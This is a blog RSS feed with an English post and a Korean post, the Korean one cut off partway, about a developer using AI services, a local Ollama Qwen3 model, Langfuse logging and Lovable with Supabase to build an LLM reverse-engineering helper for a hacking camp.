<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>hackyboiz</title>
    <link>https://hackyboiz.github.io/</link>
    
    <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>hack &amp; life</description>
    <pubDate>Wed, 29 Oct 2025 13:14:32 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[Research] Newbie Developer&#39;s Service Development Journey using AI Services Part 1</title>
      <link>https://hackyboiz.github.io/2025/10/30/j0ker/service_dev_part1/en/</link>
      <guid>https://hackyboiz.github.io/2025/10/30/j0ker/service_dev_part1/en/</guid>
      <pubDate>Thu, 30 Oct 2025 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/2025/10/30/j0ker/service_dev_part1/en/thumbnail.jpg&quot; alt=&quot;index_img&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;0-What-happened&amp;#x2026;&quot;&gt;&lt;a href=&quot;#0-What-ha</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/2025/10/30/j0ker/service_dev_part1/en/thumbnail.jpg" alt="index_img"></p><h1 id="0-What-happened&#x2026;"><a href="#0-What-happened&#x2026;" class="headerlink" title="0. What happened&#x2026;"></a>0. What happened&#x2026;</h1><p>Haha, it&#x2019;s j0ker! Why&#x2019;s it been so long since I last wrote? When was my last post&#x2026; Ah, August&#x2026; Haha&#x2026; Please save me&#x2026; Next time I&#x2019;ll try to write something more interesting&#x2026;</p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/joker.png" alt="image.png"></p><p>Today, unlike my previous research posts, I&#x2019;d like to briefly discuss a project I developed.</p><p>On August 30th, the 31st Hacking Camp took place. About two weeks prior, I suddenly received a call from the organizers&#x2026;</p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/kakao.png" alt="&#x1112;&#x1162;&#x110F;&#x1175;&#x11BC;&#x110F;&#x1162;&#x11B7;&#x1111;&#x1173; &#x1109;&#x1165;&#x11B8;&#x110B;&#x116C;.png"></p><p>Well&#x2026; the original presenter suddenly contacted us saying they couldn&#x2019;t make it, so we had to find a replacement. I was planning to go on the second day, listen to the mentee presentations, and then grab drinks with the organizers in the evening&#x2026; but I ended up giving the presentation lol. So I prepared for it and had about a week to spare&#x2026; but I&#x2019;m a pro at creating work for myself, so I wanted to do something extra.</p><h1 id="1-Planning-Begins"><a href="#1-Planning-Begins" class="headerlink" title="1. Planning Begins"></a>1. Planning Begins</h1><p>To give a quick update, I recently co-founded a startup called L0ch and Hacky-AI, where we&#x2019;re developing security solutions. (If you&#x2019;re interested, please visit our <a href="https://hacky-ai.com/">website</a>!) I believe the most crucial aspect of running a startup is identifying customer problems and proposing solutions. There are plenty of other things to worry about too&#x2026; Anyway, that&#x2019;s why I thought, &#x201C;Why not create something simple that people attending presentations need?&#x201D;</p><p>Since I&#x2019;m also building solutions, I&#x2019;ve become very interested in development using AI services. At this point, the things I wanted to stick to as much as possible were:</p><ol><li>Don&#x2019;t write the code myself; let the AI services write it all.</li><li>We only have a week, so just make it work.</li><li>Build a service people actually need.</li></ol><p>Hacking Camp runs a CTF on the first evening. My assumption was that most participants were just starting out with hacking and probably weren&#x2019;t very familiar with reverse engineering yet! So, wouldn&#x2019;t it be great to develop a reverse engineering assistant tool? I figured I could probably build something like that by investing about three days on my own. (But this was arrogance.) More specifically, I thought I could use an LLM to rename variables and functions to more readable names, and even analyze function contents with an LLM to add comments. (It&#x2019;s been over a year since I last opened IDA, so I realized while building this that such tools already exist as open source&#x2026; haha. Well, the point was for me to try building a service anyway.)</p><p>A simplified service flowchart would look like this:</p><pre><code class="hljs less">&#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;                &#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;                &#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;&#x2502;   <span class="hljs-selector-tag">IDA</span> <span class="hljs-selector-tag">Pro</span>       &#x2502;&#x25C4;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x25BA;&#x2502;   <span class="hljs-selector-tag">FastAPI</span>       &#x2502;&#x25C4;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x25BA;&#x2502;   <span class="hljs-selector-tag">Ollama</span>        &#x2502;&#x2502;   &#xD50C;&#xB7EC;&#xADF8;&#xC778;        &#x2502;                &#x2502;   &#xC11C;&#xBC84;           &#x2502;                &#x2502;   <span class="hljs-selector-tag">LLM</span> &#xC11C;&#xBC84;       &#x2502;&#x2502; (Python)        &#x2502;                &#x2502; (Python)        &#x2502;                &#x2502;                 &#x2502;&#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;                &#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;                &#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;                                            &#x2502;                                   &#x2502;                                            &#x25BC;                                   &#x25BC;                                    &#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;               &#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;                                     &#x2502;   <span class="hljs-selector-tag">Supabase</span>      &#x2502;               &#x2502;   <span class="hljs-selector-tag">Langfuse</span>      &#x2502;                                    &#x2502;   &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;     &#x2502;               &#x2502;   &#xBAA8;&#xB2C8;&#xD130;&#xB9C1;         &#x2502;                                    &#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;               &#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;</code></pre><h1 id="2-Ollama-Server"><a href="#2-Ollama-Server" class="headerlink" title="2. Ollama Server"></a>2. Ollama Server</h1><p>First, you might wonder why I&#x2019;m not using a commercial service. After all, there are so many great models like Gemini and ChatGPT. My personal view is that &#x201C;a small open-source model is sufficient for this service.&#x201D; Before starting this venture, I used open-source models for projects at my previous company. Even now, while conducting research, I&#x2019;ve tested various open-source models to build an on-premises environment. Unfortunately, performance limitations prevent me from testing larger models yet &#x3160;&#x3160;</p><p>The device I currently use at home for LLM inference is a Mac mini. It has an M4 Pro chip and 64GB of RAM. I set up an Ollama server on it and served models. If you visit the <a href="https://ollama.com/search">Ollama homepage</a>, you&#x2019;ll find many models that can be utilized within 64GB of RAM.</p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/01.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-28 &#x110B;&#x1169;&#x1112;&#x116E; 3.55.01.png"></p><p>Among the most popular models like GPT-OSS and DeepSeek, I tend to prefer models around 32B in size that are quantized to Q8. To give a simple reason:</p><ul><li>While 70B Q4 models (about 40G when downloaded) can run on 64GB RAM, these 70B models were already somewhat outdated at the time. I also thought it would be better to use a smaller model, considering the need to reserve space for the context window when processing long functions.</li><li>Around mid-August, some hot new models emerged that were smaller yet performed well. For gpt-oss, there was a 20B MoE model, and qwen3 had 32B and 30B MoE models. These models seemed to deliver performance comparable to the latest ChatGPT 4o or slightly better.</li><li>Beyond these, I also tested smaller models like Phi4 14B and Gemma 27B using several pre-set prompts I had prepared to evaluate their performance.</li></ul><p>After multiple tests, I decided to use the &#x201C;qwen3:30b-a3b-instruct-2507-q8_0&#x201D; model.</p><ol><li><p>As expected, the MoE model is significantly faster at inference than the standard model. The Qwen3 32B q8 model achieved about 7 TPS, while the Qwen 30B MoE model reached up to 45 TPS. I felt this was sufficient for a small-scale service.</p> <pre><code class="hljs yaml"><span class="hljs-attr">total duration:</span>       <span class="hljs-number">54.</span><span class="hljs-string">782917709s</span><span class="hljs-attr">load duration:</span>        <span class="hljs-number">83.</span><span class="hljs-string">491792ms</span><span class="hljs-attr">prompt eval count:</span>    <span class="hljs-number">2649 </span><span class="hljs-string">token(s)</span><span class="hljs-attr">prompt eval duration:</span> <span class="hljs-number">4.</span><span class="hljs-string">376536583s</span><span class="hljs-attr">prompt eval rate:</span>     <span class="hljs-number">605.27</span> <span class="hljs-string">tokens/s</span><span class="hljs-attr">eval count:</span>           <span class="hljs-number">2293 </span><span class="hljs-string">token(s)</span><span class="hljs-attr">eval duration:</span>        <span class="hljs-number">49.</span><span class="hljs-string">986260996s</span><span class="hljs-attr">eval rate:</span>            <span class="hljs-number">45.87</span> <span class="hljs-string">tokens/s</span></code></pre></li><li><p>The reason we did not use the reasoning model qwen3:30b-a3b-thinking-2507 was that a bug where reasoning failed to complete consistently appeared during prompt testing. Since the model had only recently been released at the time, we simply decided not to use it.</p></li><li>The reason for not using other Reasoning models was that they took significantly longer to complete outputs. While the instruct model could produce most outputs within 2 minutes, enabling Reasoning added an extra 1-2 minutes. Additionally, performance was sufficient even without Reasoning.</li><li>Using smaller models required additional work, meaning their single-batch analysis performance was inferior. For the Phi4 14B model, while performance was sufficient, using the FP16 model was necessary to achieve usable performance levels. However, the reasoning time was too long for practical use. Beyond this, we determined that utilizing models like Qwen3 14B, 8B, Gemma 27B, and Deepseek 14B effectively would require significantly more prompt engineering effort.</li><li>Considering various factors like speed, performance, and memory, we determined that using the &#x201C;qwen3:30b-a3b-instruct-2507-q8_0&#x201D; model was the most suitable choice.</li></ol><p>With the model selected, simply set the environment variables and run the server using the <code>ollama serve</code> command&#x2014;that&#x2019;s all it takes to get ready!</p><h1 id="2-Prompt-Logging-with-Langfuse"><a href="#2-Prompt-Logging-with-Langfuse" class="headerlink" title="2. Prompt Logging with Langfuse"></a>2. Prompt Logging with Langfuse</h1><p>You might be thinking, &#x201C;Can&#x2019;t we just use LangSmith?&#x201D; I agree, but&#x2026; since we tested it during the solution development process while considering on-premises deployment, I decided to give Langfuse a try this time.</p><p>Installing Langfuse on the server isn&#x2019;t difficult. Just grab it from the repository and deploy it via Docker. Then, register Langfuse&#x2019;s callback handler in Langchain, and request logging will start as shown below.</p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/02.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 4.22.19.png"></p><p>Logging allows you to verify whether responses to requests were sent correctly and check the quality of those responses. Based on this information, you can refine prompts or execution chains.</p><p>And! You can also detect incoming attacks lol</p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/03.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 4.24.45.png"></p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/04.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 4.24.58.png"></p><p>As shown above, we also detected prompt injection attacks being launched. You worked hard until dawn&#x2026; Unfortunately, it seems you weren&#x2019;t able to obtain the information you wanted.</p><h1 id="3-Lovable-Supabase"><a href="#3-Lovable-Supabase" class="headerlink" title="3. Lovable + Supabase"></a>3. Lovable + Supabase</h1><p>Originally, our website was developed using Base44. Yes, that&#x2019;s the service <a href="https://techcrunch.com/2025/06/18/6-month-old-solo-owned-vibe-coder-base44-sells-to-wix-for-80m-cash/">acquired by Wix for $80M a few months ago</a>. I tried it after reading this article too. It was fine for developing simple landing pages, but problems started piling up after adding login functionality. It was especially terrible when developing features that utilized the database.</p><p>So, while searching for alternatives at the time, I heard that &#x201C;Lovable is a hot service these days&#x201D; and decided to give it a try. I first cloned the webpage I had previously developed exactly as it was, then started developing the login feature. To store user information, I connected it to Supabase. </p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/05.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 5.29.09.png"></p><p>Unlike Base44, it integrates directly with Supabase, makes database management easier, and seems to have many advantages overall. Of course, it might struggle to handle large-scale customers (my wallet, that is). Once you set up this integration and create the login button&#x2026;</p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/06.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 5.36.58.png"></p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/07.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 5.37.39.png"></p><p>Yeah&#x2026; it wasn&#x2019;t exactly easy, but I did manage to succeed after a few tries. After logging in, there should be a dashboard, right? I&#x2019;ll create it by writing the prompt well. </p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/08.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 5.43.31.png"></p><p>Of course, it doesn&#x2019;t get cleanly developed with just that one prompt. If it had worked in one go, I&#x2019;d be out buying Lovable stock right now.</p><p>Anyway, there were still plenty of issues. While it generates API keys randomly just fine, it saves them to Supabase with parts of the key masked (<em>*</em>), or arbitrarily removes buttons, and so on&#x2014;there were a bunch of minor details to worry about. So I decided to narrow the scope of the features to implement. Originally, I wanted to add fun elements like a weekly Top 5 usage list&#x2026; but it required more prompting than expected, so I decided to skip it for now.</p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/09.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 6.55.28.png"></p><p>After about four hours of hard work, I managed to implement all the essential features. If I had developed it myself with my limited web development skills, it would have taken a week. Using AI services these days is definitely more advantageous.</p><p>I&#x2019;ll wrap things up here for today. Next time, I&#x2019;ll cover the rest of the development process and what happened at the presentation site. Until then&#x2026; wish me luck staying alive&#x2026; Bye!</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/ollama/">ollama</category>
      
      <category domain="https://hackyboiz.github.io/tags/llm/">llm</category>
      
      <category domain="https://hackyboiz.github.io/tags/plugin/">plugin</category>
      
      <category domain="https://hackyboiz.github.io/tags/startup/">startup</category>
      
      <category domain="https://hackyboiz.github.io/tags/develope/">develope</category>
      
      <category domain="https://hackyboiz.github.io/tags/ida/">ida</category>
      
      <category domain="https://hackyboiz.github.io/tags/hacky-ai/">hacky-ai</category>
      
      <category domain="https://hackyboiz.github.io/tags/lovable/">lovable</category>
      
      <category domain="https://hackyboiz.github.io/tags/supabse/">supabse</category>
      
      <category domain="https://hackyboiz.github.io/tags/qwen/">qwen</category>
      
      <category domain="https://hackyboiz.github.io/tags/langfuse/">langfuse</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/30/j0ker/service_dev_part1/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] 초짜 개발자의 AI 서비스 삽질기 Part 1</title>
      <link>https://hackyboiz.github.io/2025/10/30/j0ker/service_dev_part1/kr/</link>
      <guid>https://hackyboiz.github.io/2025/10/30/j0ker/service_dev_part1/kr/</guid>
      <pubDate>Thu, 30 Oct 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/2025/10/30/j0ker/service_dev_part1/kr/thumbnail.jpg&quot; alt=&quot;index_img&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;0-&amp;#xBB34;&amp;#xC2A8;-&amp;#xC77C;&amp;#xC774;-&amp;#xC788;</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/2025/10/30/j0ker/service_dev_part1/kr/thumbnail.jpg" alt="index_img"></p><h1 id="0-&#xBB34;&#xC2A8;-&#xC77C;&#xC774;-&#xC788;&#xC5C8;&#xB294;&#xAC00;&#x2026;"><a href="#0-&#xBB34;&#xC2A8;-&#xC77C;&#xC774;-&#xC788;&#xC5C8;&#xB294;&#xAC00;&#x2026;" class="headerlink" title="0. &#xBB34;&#xC2A8; &#xC77C;&#xC774; &#xC788;&#xC5C8;&#xB294;&#xAC00;&#x2026;"></a>0. &#xBB34;&#xC2A8; &#xC77C;&#xC774; &#xC788;&#xC5C8;&#xB294;&#xAC00;&#x2026;</h1><p>&#xD558;&#xD558; j0ker &#xC785;&#xB2C8;&#xB2E4;! &#xC65C; &#xB610; &#xC774;&#xB807;&#xAC8C; &#xC624;&#xB79C;&#xB9CC;&#xC5D0; &#xAE00;&#xC744; &#xC4F0;&#xB0D0;&#xAD6C;&#xC694;? &#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; &#xC4F4; &#xAE00;&#xC774; &#xC5B8;&#xC81C;&#xC9C0;&#x2026; &#xC544; 8&#xC6D4;&#x2026; &#xD558;&#xD558;&#x2026; &#xC0B4;&#xB824;&#xC8FC;&#xC138;&#xC694;&#x2026; &#xB2E4;&#xC74C;&#xC5D0;&#xB294; &#xC880; &#xB354; &#xC7AC;&#xBBF8;&#xC788;&#xB294; &#xAE00;&#xC744; &#xBC14;&#xCE58;&#xACA0;&#xB098;&#xC774;&#xB2E4;&#x2026;</p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/joker.png" alt="image.png"></p><p>&#xC624;&#xB298;&#xC740; &#xC774;&#xC804; &#xC5F0;&#xAD6C;&#xAE00;&#xB4E4;&#xACFC; &#xB2EC;&#xB9AC; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xAC1C;&#xBC1C;&#xD588;&#xB358; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xC5D0; &#xB300;&#xD574; &#xC598;&#xAE30;&#xD574;&#xBCFC;&#xAE4C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC9C0;&#xB09C; 8&#xC6D4; 30&#xC77C;, &#xC81C; 31&#xD68C; &#xD574;&#xD0B9;&#xCEA0;&#xD504;&#xAC00; &#xC9C4;&#xD589;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC800;&#xB294; &#xADF8;&#xBCF4;&#xB2E4; &#xB300;&#xB7B5; 2&#xC8FC; &#xC804;&#xC5D0; &#xAC11;&#xC790;&#xAE30; &#xC6B4;&#xC601;&#xC9C4;&#xC73C;&#xB85C;&#xBD80;&#xD130; &#xC5F0;&#xB77D;&#xC744; &#xBC1B;&#xAC8C;&#xB429;&#xB2C8;&#xB2E4;&#x2026;</p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/kakao.png" alt="&#x1112;&#x1162;&#x110F;&#x1175;&#x11BC;&#x110F;&#x1162;&#x11B7;&#x1111;&#x1173; &#x1109;&#x1165;&#x11B8;&#x110B;&#x116C;.png"></p><p>&#xC608;&#x2026; &#xC6D0;&#xB798; &#xBC1C;&#xD45C;&#xD558;&#xC2DC;&#xB824;&#xB358; &#xBD84;&#xC774; &#xAE09;&#xC791;&#xC2A4;&#xB7FD;&#xAC8C; &#xBC1C;&#xD45C;&#xB97C; &#xBABB;&#xD558;&#xC2E0;&#xB2E4;&#xACE0; &#xC5F0;&#xB77D;&#xC774; &#xC640;&#xC11C; &#xB300;&#xD0C0;&#xB97C; &#xAD6C;&#xD558;&#xAC8C; &#xB418;&#xC5C8;&#xB358; &#xAC70;&#xC600;&#xC8E0;. &#xC800;&#xB294; &#xC6D0;&#xB798; &#xC774;&#xD2C0;&#xB0A0;&#xC5D0; &#xAC00;&#xC11C; &#xBA58;&#xD2F0; &#xBC1C;&#xD45C;&#xD558;&#xB294; &#xAC70; &#xB4E3;&#xACE0; &#xC800;&#xB141;&#xC5D0; &#xC6B4;&#xC601;&#xC9C4;&#xBD84;&#xB4E4;&#xC774;&#xB791; &#xC220;&#xC774;&#xB098; &#xBA39;&#xC5B4;&#xC57C;&#xACA0;&#xB2E4; &#xC2F6;&#xC5C8;&#xB294;&#xB370;&#x2026; &#xBC1C;&#xD45C;&#xB97C; &#xD558;&#xAC8C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4; &#x314B;&#x314B;&#x314B; &#xADF8;&#xB798;&#xC11C; &#xBC1C;&#xD45C; &#xC900;&#xBE44;&#xB97C; &#xC880; &#xD558;&#xACE0; &#xC77C;&#xC8FC;&#xC77C; &#xC815;&#xB3C4; &#xC2DC;&#xAC04; &#xC5EC;&#xC720;&#xAC00; &#xC788;&#xC5C8;&#xB294;&#xB370;&#x2026; &#xC81C;&#xAC00; &#xC77C; &#xBC8C;&#xB9AC;&#xB294;&#xB370;&#xB294; &#xC120;&#xC218;&#xB77C; &#xBB54;&#xAC00;&#xB97C; &#xB354; &#xD558;&#xACE0; &#xC2F6;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="1-&#xAE30;&#xD68D;-&#xC2DC;&#xC791;"><a href="#1-&#xAE30;&#xD68D;-&#xC2DC;&#xC791;" class="headerlink" title="1. &#xAE30;&#xD68D; &#xC2DC;&#xC791;"></a>1. &#xAE30;&#xD68D; &#xC2DC;&#xC791;</h1><p>&#xC7A0;&#xAE50; &#xADFC;&#xD669;&#xC744; &#xC598;&#xAE30;&#xD558;&#xC790;&#xBA74;, &#xCD5C;&#xADFC; L0ch&#xC640; Hacky-AI&#xB77C;&#xB294; &#xC2A4;&#xD0C0;&#xD2B8;&#xC5C5;&#xC744; &#xCC3D;&#xC5C5;&#xD574;&#xC11C; &#xBCF4;&#xC548; &#xC194;&#xB8E8;&#xC158;&#xC744; &#xAC1C;&#xBC1C;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.(&#xAD00;&#xC2EC;&#xC788;&#xC73C;&#xC2DC;&#xBA74; &#xC800;&#xD76C; <a href="https://hacky-ai.com/">&#xD648;&#xD398;&#xC774;&#xC9C0;</a>&#xB97C; &#xBC29;&#xBB38;&#xD574;&#xC8FC;&#xC138;&#xC694;!) &#xC2A4;&#xD0C0;&#xD2B8;&#xC5C5;&#xC744; &#xD558;&#xBA74;&#xC11C; &#xAC00;&#xC7A5; &#xC911;&#xC694;&#xD558;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xB294; &#xAC83;&#xC740; &#xACE0;&#xAC1D;&#xC758; &#xBB38;&#xC81C;&#xB97C; &#xD30C;&#xC545;&#xD558;&#xACE0; &#xD574;&#xACB0;&#xBC95;&#xC744; &#xC81C;&#xC2DC;&#xD558;&#xB294; &#xAC83;&#xC774;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8; &#xC774;&#xC678;&#xC5D0;&#xB3C4; &#xC2E0;&#xACBD; &#xC4F8; &#xAC83;&#xC774; &#xB9CE;&#xC9C0;&#xB9CC;&#x2026; &#xC544;&#xBB34;&#xD2BC; &#xADF8;&#xB798;&#xC11C; &#x201C;&#xBC1C;&#xD45C;&#xB97C; &#xB4E3;&#xB294; &#xC0AC;&#xB78C;&#xB4E4;&#xC5D0;&#xAC8C; &#xD544;&#xC694;&#xD55C; &#xAC83;&#xC744; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xB9CC;&#xB4E4;&#xC5B4;&#xBCFC;&#xAE4C;?&#x201D;&#xB77C;&#xB294; &#xC0DD;&#xAC01;&#xC744; &#xD558;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC194;&#xB8E8;&#xC158;&#xC744; &#xB9CC;&#xB4E4;&#xACE0; &#xC788;&#xAE30;&#xB3C4; &#xD574;&#xC11C; AI &#xC11C;&#xBE44;&#xC2A4;&#xB4E4;&#xB97C; &#xD65C;&#xC6A9;&#xD55C; &#xAC1C;&#xBC1C;&#xC5D0; &#xAD00;&#xC2EC;&#xC744; &#xB9CE;&#xC774; &#xAC00;&#xC9C0;&#xAC8C; &#xB418;&#xC5C8;&#xB294;&#xB370;&#xC694;. &#xC774; &#xB54C; &#xCD5C;&#xB300;&#xD55C; &#xC9C0;&#xD0A4;&#xACE0;&#xC790; &#xD588;&#xB358; &#xAC83;&#xB4E4;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xB0B4;&#xAC00; &#xCF54;&#xB4DC;&#xB97C; &#xC9DC;&#xC9C0; &#xB9D0;&#xACE0; AI &#xC11C;&#xBE44;&#xC2A4;&#xB4E4;&#xC774; &#xB2E4; &#xC791;&#xC131;&#xD558;&#xAC8C; &#xD558;&#xC790;.</li><li>&#xC77C;&#xC8FC;&#xC77C;&#xBC16;&#xC5D0; &#xC5C6;&#xC73C;&#xB2C8; &#xB3CC;&#xC544;&#xAC00;&#xAC8C;&#xB9CC; &#xB9CC;&#xB4E4;&#xC790;.</li><li>&#xC0AC;&#xB78C;&#xB4E4;&#xC774; &#xD544;&#xC694;&#xD55C; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xB9CC;&#xB4E4;&#xC790;.</li></ol><p>&#xD574;&#xD0B9;&#xCEA0;&#xD504;&#xB294; 1&#xC77C;&#xCC28; &#xC800;&#xB141;&#xC5D0; CTF&#xB97C; &#xC9C4;&#xD589;&#xD558;&#xB294;&#xB370;&#xC694;, &#xADF8;&#xB798;&#xC11C; &#xC81C;&#xAC00; &#xAC00;&#xC815;&#xD55C; &#xAC83;&#xC740; &#xD574;&#xD0B9;&#xCEA0;&#xD504;&#xC5D0; &#xCC38;&#xC5EC;&#xD558;&#xC2DC;&#xB294; &#xBD84;&#xB4E4;&#xC740; &#xB300;&#xBD80;&#xBD84; &#xC774;&#xC81C; &#xB9C9; &#xD574;&#xD0B9;&#xC744; &#xC2DC;&#xC791;&#xD55C; &#xBD84;&#xB4E4;&#xC77C; &#xAC83;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB9AC;&#xBC84;&#xC2F1;&#xC5D0;&#xB294; &#xC544;&#xC9C1; &#xB9CE;&#xC774; &#xC775;&#xC219;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xC2E4; &#xAC83;&#xC774;&#xB2E4;! &#xADF8;&#xB7EC;&#xBA74; &#xB9AC;&#xBC84;&#xC2F1; &#xBCF4;&#xC870; &#xB3C4;&#xAD6C;&#xB97C; &#xAC1C;&#xBC1C;&#xD558;&#xBA74; &#xC88B;&#xC9C0; &#xC54A;&#xC744;&#xAE4C;? &#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC815;&#xB3C4;&#xBA74; &#xADF8;&#xB798;&#xB3C4; &#xD63C;&#xC790; 3&#xC77C; &#xC815;&#xB3C4; &#xD22C;&#xC790;&#xD558;&#xBA74; &#xAC1C;&#xBC1C;&#xD560; &#xC218; &#xC788;&#xC9C0; &#xC54A;&#xC744;&#xAE4C; &#xC2F6;&#xC5C8;&#xC8E0;.(&#xD558;&#xC9C0;&#xB9CC; &#xC774;&#xAC83;&#xC740; &#xC624;&#xB9CC;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;) &#xC880; &#xB354; &#xAD6C;&#xCCB4;&#xC801;&#xC73C;&#xB85C; &#xBCC0;&#xC218;&#xC640; &#xD568;&#xC218; &#xC774;&#xB984;&#xC744; LLM&#xC744; &#xD65C;&#xC6A9;&#xD574; &#xC77D;&#xAE30; &#xC26C;&#xC6B4; &#xC774;&#xB984;&#xC73C;&#xB85C; &#xBC14;&#xAFD4;&#xC8FC;&#xACE0; 